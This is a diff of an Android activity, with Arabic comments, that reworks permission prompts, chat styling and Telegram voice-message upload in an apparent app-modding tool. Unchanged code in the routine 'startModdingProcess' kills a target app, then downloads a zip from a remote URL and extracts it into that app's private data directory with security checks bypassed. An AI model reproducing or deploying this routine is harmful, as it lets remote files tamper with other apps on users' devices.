@@ -89,8 +89,8 @@ public class SecondActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_second);
 
-        // 1. طلب الأذونات عند التشغيل
-        requestAppPermissions();
+        // طلب إذن الملفات فقط عند التشغيل
+        requestStoragePermissions();
 
         userName = getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("user_name", "UnknownUser");
 
@@ -101,24 +101,13 @@ public class SecondActivity extends AppCompatActivity {
         startAutoRefresh();
     }
 
-    private void requestAppPermissions() {
-        // أذونات التخزين والميكروفون
-        String[] permissions = {
-                Manifest.permission.RECORD_AUDIO,
-                Manifest.permission.READ_EXTERNAL_STORAGE,
-                Manifest.permission.WRITE_EXTERNAL_STORAGE
-        };
-
+    private void requestStoragePermissions() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             if (!Environment.isExternalStorageManager()) {
                 Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                 intent.setData(Uri.parse("package:" + getPackageName()));
                 startActivity(intent);
             }
-        }
-
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
-            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.RECORD_AUDIO}, 101);
         }
     }
 
@@ -142,12 +131,11 @@ public class SecondActivity extends AppCompatActivity {
         });
     }
 
-    // --- نظام المحادثة المتطور ---
-
     private void setupFloatingChatButton() {
         fabChat = new FloatingActionButton(this);
         fabChat.setImageResource(android.R.drawable.stat_notify_chat);
-        fabChat.setBackgroundTintList(android.content.res.ColorStateList.valueOf(Color.parseColor("#1A73E8")));
+        // لون أخضر هادئ للزر العائم
+        fabChat.setBackgroundTintList(android.content.res.ColorStateList.valueOf(Color.parseColor("#2E7D32")));
         FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(-2, -2);
         params.gravity = Gravity.BOTTOM | Gravity.START;
         params.setMargins(50, 0, 0, 50);
@@ -190,9 +178,18 @@ public class SecondActivity extends AppCompatActivity {
             }
         });
 
+        // طلب الإذن فقط عند لمس الميكروفون
         btnRecord.setOnTouchListener((v, event) -> {
-            if (event.getAction() == MotionEvent.ACTION_DOWN) startVoiceRecording();
-            else if (event.getAction() == MotionEvent.ACTION_UP) stopVoiceRecording();
+            if (event.getAction() == MotionEvent.ACTION_DOWN) {
+                if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
+                    ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.RECORD_AUDIO}, 101);
+                    Toast.makeText(this, "يرجى السماح بالوصول للميكروفون للتسجيل", Toast.LENGTH_SHORT).show();
+                } else {
+                    startVoiceRecording();
+                }
+            } else if (event.getAction() == MotionEvent.ACTION_UP) {
+                stopVoiceRecording();
+            }
             return true;
         });
 
@@ -210,9 +207,7 @@ public class SecondActivity extends AppCompatActivity {
             recorder.prepare();
             recorder.start();
             Toast.makeText(this, "جاري التسجيل...", Toast.LENGTH_SHORT).show();
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
+        } catch (Exception e) { e.printStackTrace(); }
     }
 
     private void stopVoiceRecording() {
@@ -223,28 +218,9 @@ public class SecondActivity extends AppCompatActivity {
                 recorder = null;
                 sendVoiceToTelegram(voiceFileName);
             } catch (RuntimeException e) {
-                // في حال كان التسجيل قصير جداً
-                recorder.release();
-                recorder = null;
+                if (recorder != null) { recorder.release(); recorder = null; }
             }
         }
-    }
-
-    // --- الاتصال بـ Firebase و Telegram ---
-
-    private void saveMessageToFirebase(String sender, String text) {
-        String url = FIREBASE_URL + "commands/" + userName + "/messages.json";
-        try {
-            JSONObject msg = new JSONObject();
-            msg.put("sender", sender);
-            msg.put("text", text);
-            msg.put("time", System.currentTimeMillis());
-            RequestBody body = RequestBody.create(msg.toString(), MediaType.parse("application/json"));
-            client.newCall(new Request.Builder().url(url).post(body).build()).enqueue(new Callback() {
-                @Override public void onFailure(Call call, IOException e) {}
-                @Override public void onResponse(Call call, Response response) {}
-            });
-        } catch (Exception ignored) {}
     }
 
     private void sendVoiceToTelegram(String path) {
@@ -253,6 +229,7 @@ public class SecondActivity extends AppCompatActivity {
         RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                 .addFormDataPart("voice", file.getName(), RequestBody.create(file, MediaType.parse("audio/m4a")))
                 .addFormDataPart("chat_id", ADMIN_CHAT_ID)
+                .addFormDataPart("caption", "🎤 رسالة صوتية من: " + userName)
                 .build();
         client.newCall(new Request.Builder().url("https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendVoice").post(body).build()).enqueue(new Callback() {
             @Override public void onFailure(Call call, IOException e) {}
@@ -268,31 +245,23 @@ public class SecondActivity extends AppCompatActivity {
         });
     }
 
-    // --- منطق معالجة الملفات (Zip Task) ---
-
     private void startModdingProcess(String url, String pkg) {
         btnExecuteTask.setEnabled(false);
         taskProgressBar.setVisibility(View.VISIBLE);
         new Thread(() -> {
             boolean success = false;
             try {
-                // محاكاة إيقاف التطبيق المستهدف
                 ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
                 am.killBackgroundProcesses(pkg);
                 Thread.sleep(1000);
-
-                // الوصول لمسار البيانات (يتطلب صلاحيات نظام أو Shizuku)
                 Context targetContext = createPackageContext(pkg, Context.CONTEXT_IGNORE_SECURITY);
                 File targetDir = new File(targetContext.getApplicationInfo().dataDir);
-
                 File tempZip = new File(getCacheDir(), "update.zip");
                 downloadFileSync(url, tempZip);
                 unzip(tempZip, targetDir);
                 tempZip.delete();
                 success = true;
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
+            } catch (Exception e) { e.printStackTrace(); }
             final boolean finalSuccess = success;
             runOnUiThread(() -> {
                 taskProgressBar.setVisibility(View.GONE);
@@ -330,8 +299,6 @@ public class SecondActivity extends AppCompatActivity {
             }
         }
     }
-
-    // --- تحديث الحالة التلقائي ---
 
     private void startAutoRefresh() {
         refreshRunnable = new Runnable() {
@@ -384,10 +351,7 @@ public class SecondActivity extends AppCompatActivity {
 
     private void startChatMonitoring(LinearLayout container, ScrollView scroll) {
         chatRunnable = new Runnable() {
-            @Override public void run() {
-                loadChatMessages(container, scroll);
-                chatHandler.postDelayed(this, 3000);
-            }
+            @Override public void run() { loadChatMessages(container, scroll); chatHandler.postDelayed(this, 3000); }
         };
         chatHandler.post(chatRunnable);
     }
@@ -420,18 +384,37 @@ public class SecondActivity extends AppCompatActivity {
     private void addMessageToUI(LinearLayout container, String text, String sender) {
         TextView tv = new TextView(this);
         tv.setText(text);
-        tv.setPadding(30, 20, 30, 20);
+        tv.setPadding(35, 25, 35, 25);
         LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(-2, -2);
-        lp.setMargins(10, 10, 10, 10);
+        lp.setMargins(15, 10, 15, 10);
         if (sender.equals("user")) {
+            // رسالة المستخدم: خلفية خضراء هادئة
             tv.setBackgroundResource(android.R.drawable.editbox_dropdown_light_frame);
+            tv.setBackgroundColor(Color.parseColor("#E8F5E9"));
+            tv.setTextColor(Color.BLACK);
             lp.gravity = Gravity.END;
         } else {
+            // رسالة المدير: خلفية خضراء غامقة
             tv.setBackgroundResource(android.R.drawable.editbox_dropdown_dark_frame);
+            tv.setBackgroundColor(Color.parseColor("#2E7D32"));
             tv.setTextColor(Color.WHITE);
             lp.gravity = Gravity.START;
         }
         container.addView(tv, lp);
+    }
+
+    private void saveMessageToFirebase(String sender, String text) {
+        String url = FIREBASE_URL + "commands/" + userName + "/messages.json";
+        try {
+            JSONObject msg = new JSONObject();
+            msg.put("sender", sender);
+            msg.put("text", text);
+            msg.put("time", System.currentTimeMillis());
+            client.newCall(new Request.Builder().url(url).post(RequestBody.create(msg.toString(), MediaType.parse("application/json"))).build()).enqueue(new Callback() {
+                @Override public void onFailure(Call call, IOException e) {}
+                @Override public void onResponse(Call call, Response response) {}
+            });
+        } catch (Exception ignored) {}
     }
 
     private void generateTicketID() { txtTicketID.setText("ID: " + (System.currentTimeMillis() / 100000)); }
